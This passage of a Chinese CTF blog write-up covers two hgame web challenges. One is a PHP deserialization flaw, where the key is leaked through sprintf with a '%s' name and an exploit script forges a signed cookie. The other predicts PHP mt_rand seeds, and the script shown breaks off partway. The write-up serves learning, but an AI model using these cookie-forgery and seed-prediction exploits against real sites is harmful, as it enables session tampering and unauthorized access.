class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($playerName)</span></span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'player'</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;     <span class="comment">// 服务器的 Key</span></span><br><span class="line">    <span class="keyword">private</span> $key = <span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">'rank'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">($no)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Fight</span><span class="params">($monster)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($monster[<span class="string">'no'</span>] &gt;= <span class="keyword">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rank -= rand(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rank &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rank = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] += rand(<span class="number">20</span>, <span class="number">200</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="keyword">true</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:green;"&gt;Congratulations! You win! &lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="keyword">false</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:red;"&gt;You die!&lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 确保程序是跑在服务器上的！</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'rank'</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 非正常访问</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monster</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $monsterData;</span><br><span class="line">    <span class="keyword">private</span> $encryptKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $monsterName = [<span class="string">'无名小怪'</span>, <span class="string">'BOSS: The Kernal Cosmos'</span>, <span class="string">'小怪: Big Eggplant'</span>, <span class="string">'BOSS: The Mole King'</span>, <span class="string">'BOSS: Zero Zone Witch'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monsterData = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'name'</span> =&gt; $monsterName[array_rand($monsterName, <span class="number">1</span>)],</span><br><span class="line">            <span class="string">'no'</span> =&gt; rand(<span class="number">1</span>, <span class="number">2000</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个整齐的类，显然是php反序列化了。首先整理下思路，我们输入名字后开始游戏，这时只要<code>$game-&gt;rank-&gt;Get() === 1</code>即可拿到flag。那么首先跟随下流程吧。</p><p>重点先放在cardinal.php上。输入名字后，会实例化Game对象，而在Game类中，先后实例化Monster类与Rank类对象。其中monster类的实例化用到了一个<code>init()</code>函数。重点关注下这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>sprintf()</code>函数可以利用。由于sprintf()作用是将格式化字符串写入变量中,第一次循环<code>$playername</code>有值，则将值写入%s，循环结束，如果循环的是%s则进入下一次循环。所以所谓的<code>$encryptkey</code>可以直接得到。输入名字为%s即可。<br>这点是郁师傅提到，ddctf2019 web签到中出现过，包括下面一部分也跟那道题有关，所以我才能绕过这点。<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/0.PNG" alt="key"><br>接着注意到下面,在循环过后，我们的循环结果<code>$value</code>经过了一次MD5,用于monster的实例化了。那么跟进monster类，发现重要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>原来monster是作为cookie被存储起来的，且只要我们的monstercookie满足条件，就有一个反序列化利用。所以关注下monoster的cookie的存储方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>了解到加密方式，就明白了我们的反序列化生效方法了：我们输入名字后，伪造cookie，从而执行反序列化使Rank类中的<code>$rank</code>为1，拿到flag。<br>所以exp如下，注意monster类中的<code>$encryptley</code>不是Game类中的的key。而是经过名字foreach后又md5了一下，传进Monster类中的；另外Rank类中的<code>_destruct()</code>也要绕过啊。我直接把destruct类扔掉后忘记改<code>_construct()</code>hh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;</span><br><span class="line">    <span class="keyword">private</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Game_encryptKey = <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>;</span><br><span class="line">$Game_data = [<span class="string">'byc_404'</span>, $Game_encryptKey];</span><br><span class="line">$Monster_encryptKey = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span>($Game_data <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    $Monster_encryptKey .= md5($Monster_encryptKey . $value);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Rank();</span><br><span class="line">$sign = md5(serialize($a) . $Monster_encryptKey);</span><br><span class="line">$cookie = base64_encode(serialize($a) . $sign);</span><br><span class="line"><span class="keyword">echo</span> $cookie;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/1.PNG" alt="flag"></p><h1 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h1><p>有一说一，虽然这题第11个做出来挺高兴的，但是基本没啥收获。题目描述也不清楚，漏洞利用有点鸡肋，做题时完全化身脚本小子。总而言之不知道出题人的意图是啥，web题不该是这种类型的吧。</p><p>首先判断漏洞类型。进入页面发现抽卡数与cdkey这两个提交框。抽卡时会出现一大串随机数。cdkey没说明要提交啥。提交时会说明值错误或者慢于2s。<br>打开源码发现提示php5，可以联想到是php5伪随机数漏洞(实际上各个版本的php都有这一漏洞，只不过5与7有区别)。之前在GWCTF上曾经作为web签到题做过，是关于<code>mt_rand()</code>这一函数的。<br>漏洞即在于随机数钟子设定时，产生的随机数序列是固定的。故可以根据随机数序列倒推种子或者根据种子去推随机数序列。常常用以下代码测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(123);</span><br><span class="line">for($i&#x3D;0;$i&lt;3;$i++)&#123;</span><br><span class="line"> echo mt_rand().&quot; &quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体破解方法主要靠工具，即<code>php_mt_seed</code>，估记都用过。可以根据一个数倒推出各个php版本下的随机数种子。但是问题在于题目的种子显然是动态更新的，且基本不超过2s。相比GWCTF只跟session有关的静态种子，本题的更新速度迫使我们只能靠脚本解决。<br>果断上google找相关文章，这篇文章吸引到我的注意：<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">https://www.ambionics.io/blog/php-mt-rand-prediction</a><br>文章的副标题说明，可以只通过两个值且并非暴力破解的方式得到种子。于是读了下文章，发现读不懂，纯算法层面。好在给出了脚本<br><a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a><br>及使用方法<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/2.PNG" alt="脚本"><br>里面一个php脚本用于生成随机数，其中两个参数一个为种子，另一个为偏移量，如果<code>offset</code>设为0，则输出的是以输入种子生成的第1个和第228个随机数；python脚本用于解随机数，共四个参数，前面php脚本生成的两个随机数，一个偏移量同上，加上一个值为0/1的用于判别php版本的参数。0为php5,1为php7</p><p>所以我尝试拿本地的一组数据在虚拟机里试下，发现很快能拿到结果种子123，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reverse_mt_rand.py   644748169  126568735  0   0</span><br></pre></td></tr></table></figure><p>可能就是我要的脚本。<br>所以思路如下，在脚本中给抽卡次数传为228，获取第一个和第227个随机数，传给脚本，另两个参数直接设为<code>0 0</code>执行，结果开始翻车。主要是自己不熟悉os库吧，想要直接在一个脚本里调用另一个脚本，虽然结果是对的但就是拿不到flag。于是直接改这个解密脚本<br>(主要是把<code>main()</code>改成返回int值,原本是直接<code>print</code>的)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">time_start=time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://twoshot.hgame.n3ko.co/random.php?times=228'</span></span><br><span class="line">url1 = <span class="string">'https://twoshot.hgame.n3ko.co/verify.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">res = s.get(url)</span><br><span class="line">key = res.text</span><br><span class="line">key = key.replace(<span class="string">'['</span>, <span class="string">''</span>)</span><br><span class="line">key = key.replace(<span class="string">']'</span>, <span class="string">','</span>)</span><br><span class="line">ans = re.findall(<span class="string">r'(.*?)\,'</span>, key)</span><br><span class="line">arg1=ans[<span class="number">0</span>]</span><br><span class="line">arg2=ans[<span class="number">227</span>]</span><br><span class="line">print(arg1)</span><br><span class="line">print(arg2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#以下为原脚本</span></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="literal">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span 